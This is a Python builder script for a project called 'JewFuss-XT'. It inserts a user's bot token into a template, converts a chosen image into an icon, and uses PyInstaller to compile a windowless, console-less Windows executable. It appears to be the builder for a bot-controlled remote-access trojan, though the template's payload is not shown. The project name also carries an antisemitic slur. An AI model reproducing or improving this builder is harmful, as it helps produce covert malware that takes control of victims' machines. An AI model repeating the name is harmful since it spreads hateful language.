import os
import shutil
import tempfile
import subprocess
from PIL import Image
from plyer import filechooser
import time

save_unpackaged = True  # This is the only thing you should mess with otherwise you may break it

template_path = os.path.abspath('./source/JewFuss-XT.template.py')
output_dir = os.path.abspath('builds')
data_dir = os.path.abspath('data')
output_path = os.path.join(output_dir, 'JewFuss-XT.exe')
log_file_path = os.path.join(output_dir, 'easy-compiler-build.log')
search_string = '# Do not remove or modify this string (easy compiler looks for this) - 23r98h'

if os.path.isfile(os.path.join(data_dir, "icon.ico")):
    os.remove(os.path.join(data_dir, "icon.ico"))
    
def is_valid_image(file_path):
    try:
        img = Image.open(file_path)
        img.verify()
        return True
    except (IOError, SyntaxError):
        return False
    
while True:
    useicon = input("Would you like to use a custom icon? [y(es)/n(o)]\n>> ")
    while True:
        if useicon.lower().startswith("y"):
            useicon = True
            break
        
        elif useicon.lower().startswith("n"):
            break
        
        else:
            useicon = input("Invalid option, please choose [y(es)/n(o)]\n>> ")
            
    icon = filechooser.open_file(multiple=True, filters=['*.png', '*.jpeg', '*.jpg', '*.bmp', '*.gif', '*.tiff'])[0]
    
    if not icon:
        print("No icon provided, using default PyInstaller icon")
        icon = None
        break

    if not os.path.isfile(icon):
        print("Please enter a valid image file path")
        continue

    if not is_valid_image(icon):
        print("Please enter a valid image")
        continue

    file_ext = os.path.splitext(icon)[1].lower()
    
    if file_ext == '.ico':
        break

    try:
        img = Image.open(icon)
        ico_path = os.path.join(data_dir, "icon.ico")
        img.save(ico_path, format='ICO')
        print(f"icon image converted to ico.")
        icon = ico_path
        break
    except Exception as e:
        print(f"Error converting image: {e}")
        continue

while True:
    user_input = input('Please enter bot token:\n>> ').strip()
    if user_input:
        user_input = f'TOKEN = "{user_input}"'
        break
    else:
        print("Error: input cannot be empty\n")

print("\nTemplate path:", template_path)
print("\nOutput directory:", output_dir)
print("\nOutput location:", output_path)
if icon:
    print("\nIcon path:", icon)
print("\nLog file path:", log_file_path + "\n")

with open(template_path, 'r', encoding='utf-8') as file:
    lines = file.readlines()

for i, line in enumerate(lines):
    if search_string in line:
        lines[i] = user_input + '\n'
        break

temp_dir = tempfile.mkdtemp()
temp_file = os.path.join(temp_dir, 'temp.py')

if os.path.exists(output_path):
    timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
    new_name = f"{timestamp}-JewFuss-XT.exe"
    new_path = os.path.join(output_dir, new_name)
    os.rename(output_path, new_path)
    print(f"\nRenaming {os.path.basename(output_path)} to {new_name}\n")
elif not os.path.exists(output_dir):
    os.makedirs(output_dir)

if not os.path.exists(data_dir):
    os.makedirs(data_dir)

timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

with open(temp_file, 'w', encoding='utf-8') as file:
    file.writelines(lines)

if save_unpackaged:
    if not os.path.exists(os.path.dirname(os.path.abspath(__file__))+"\\builds\\unpackaged-latest.py"):
        with open(os.path.dirname(os.path.abspath(__file__))+"\\builds\\unpackaged-latest.py", 'w', encoding='utf-8') as file:
            file.writelines(lines)

cmd = [
    'pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', 
    f'--distpath={output_dir}', f'--workpath={data_dir}', '-n=JewFuss-XT.exe'
]
if icon:
    cmd.extend(['--icon', icon])

subprocess.run(cmd)
shutil.rmtree(temp_dir)

with open(log_file_path, 'a') as log_file:
    log_file.write(f"\"{timestamp}\": {user_input} JewFuss-XT.exe\n")